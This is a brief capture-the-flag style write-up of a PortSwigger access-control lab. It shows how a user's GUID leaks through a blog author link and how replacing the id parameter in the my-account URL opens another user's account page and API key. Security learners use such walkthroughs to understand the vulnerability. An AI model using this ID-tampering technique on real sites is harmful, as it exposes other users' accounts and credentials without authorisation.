# [Lab: User ID controlled by request parameter, with unpredictable user IDs](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids)

This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs.

To solve the lab, find the GUID for `carlos`, then submit his API key as the solution.

You can log in to your own account using the following credentials: `wiener:peter`

## Analysis

login to `wiener` account, click to `my account` button.

```url
https://id.web-security-academy.net/my-account?id=41d61169-8729-4ecf-9fb0-213692c63892
```

there is an `id` parameter in url, with random value.

in post id=3, there is an `a` tag:

```html
<a href="/blogs?userId=80bf4a7b-e7f6-4d28-af58-135a2595fe8d">carlos</a>
```

## Solutions

replace `id` at `my-account` request with `carlos`'s id:

```url
https://id.web-security-academy.net/my-account?id=80bf4a7b-e7f6-4d28-af58-135a2595fe8d
```

=> solved
